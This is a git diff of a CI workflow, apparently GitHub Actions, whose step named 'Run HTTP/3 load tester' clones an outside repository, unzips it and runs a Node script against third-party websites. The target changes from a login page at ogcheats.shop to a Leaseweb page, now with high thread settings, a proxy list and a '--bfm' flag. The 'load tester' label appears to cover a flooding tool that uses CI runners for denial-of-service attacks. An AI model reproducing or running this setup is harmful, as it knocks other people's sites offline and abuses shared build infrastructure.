@@ -30,14 +30,14 @@ jobs:
       
       - name: Run HTTP/3 load tester
         run: |
-          npm i chalk@4 colors request   hpack cluster   puppeteer-real-browser
+          npm i chalk@4 colors request   hpack cluster   
           pip install requests
           git clone https://github.com/Fegp1p2/ideal-guide.git
           chmod +x *
           unzip Fc-main.zip 
           
           cd Fc-main
-          node m.js  https://ogcheats.shop/login 200 3 3 3
+          node a.js GET  https://www.leaseweb.com/en/?srsltid= 700 4 90 proxy.txt --bfm --debug 
 
           
 
